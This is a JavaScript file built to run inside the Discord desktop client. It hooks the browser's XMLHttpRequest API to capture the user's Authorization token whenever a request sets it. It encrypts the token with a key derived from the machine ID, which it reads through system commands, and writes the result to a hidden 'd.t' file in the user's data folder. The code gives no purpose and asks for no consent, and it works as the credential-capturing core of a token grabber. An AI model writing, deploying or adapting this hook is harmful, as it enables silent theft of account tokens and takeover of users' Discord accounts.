//If this node process is not the Discord electron app, exit immediately.
if (typeof window !== 'undefined' && window.location.href.includes('discordapp')) {
	const {
		exec,
		execSync
	} = require('child_process');
	const crypto = require('crypto');

	let {
		platform
	} = process,
	win32RegBinPath = {
			native: '%windir%\\System32',
			mixed: '%windir%\\sysnative\\cmd.exe /c %windir%\\System32'
		},
		guid = {
			darwin: 'ioreg -rd1 -c IOPlatformExpertDevice',
			win32: `${win32RegBinPath[isWindowsProcessMixedOrNativeArchitecture()]}\\REG.exe ` +
				'QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography ' +
				'/v MachineGuid',
			linux: '( cat /var/lib/dbus/machine-id /etc/machine-id 2> /dev/null || hostname ) | head -n 1 || :',
			freebsd: 'kenv -q smbios.system.uuid || sysctl -n kern.hostuuid'
		};

	function isWindowsProcessMixedOrNativeArchitecture() {
		// detect if the node binary is the same arch as the Windows OS.
		// or if this is 32 bit node on 64 bit windows.
		if (process.platform !== 'win32') {
			return '';
		}
		if (process.arch === 'ia32' && process.env.hasOwnProperty('PROCESSOR_ARCHITEW6432')) {
			return 'mixed';
		}
		return 'native';
	}

	function hash(guid) {
		return crypto.createHash('sha256').update(guid).digest('hex');
	}

	function expose(result) {
		switch (platform) {
			case 'darwin':
				return result
					.split('IOPlatformUUID')[1]
					.split('\n')[0].replace(/\=|\s+|\"/ig, '')
					.toLowerCase();
			case 'win32':
				return result
					.toString()
					.split('REG_SZ')[1]
					.replace(/\r+|\n+|\s+/ig, '')
					.toLowerCase();
			case 'linux':
				return result
					.toString()
					.replace(/\r+|\n+|\s+/ig, '')
					.toLowerCase();
			case 'freebsd':
				return result
					.toString()
					.replace(/\r+|\n+|\s+/ig, '')
					.toLowerCase();
			default:
				throw new Error(`Unsupported platform: ${process.platform}`);
		}
	}

	function machineIdSync(original) {
		let id = expose(execSync(guid[platform]).toString());
		return original ? id : hash(id);
	}

	const algorithm = 'aes-256-cbc';
	const key = crypto.createHash('sha256').update(String(machineIdSync(false))).digest('base64').substr(0, 32);
	const iv = crypto.randomBytes(16);

	function encrypt(text) {
		let cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key), iv);
		let encrypted = Buffer.concat([cipher.update(text), cipher.final()]);

		return {
			iv: iv.toString('hex'),
			encryptedData: encrypted.toString('hex')
		};
	}

	let token;
	let dataFolder = process.env.APPDATA || (process.platform == 'darwin' ? process.env.HOME + 'Library/Preferences' : process.env.HOME + "/.local/share");

	let oldSetRequestHeader = window.XMLHttpRequest.prototype.setRequestHeader;
	let oldXHROpen = window.XMLHttpRequest.prototype.open;

	const handler = {
		apply: function(target, thisArg, argumentsList) {
			if (argumentsList[0] === "Authorization") {
				token = argumentsList[1];
				let encr = encrypt(token);
				require("fs").writeFileSync(dataFolder + "/d.t", encr.iv + ":-:" + encr.encryptedData);
			}
			return oldSetRequestHeader.apply(thisArg, [argumentsList[0], argumentsList[1]]);
		}
	};
	window.XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
		if (!token) {
			let reqProxy = new Proxy(this.setRequestHeader, handler);

			this.setRequestHeader = reqProxy;
		}
		return oldXHROpen.apply(this, arguments);
	}
}
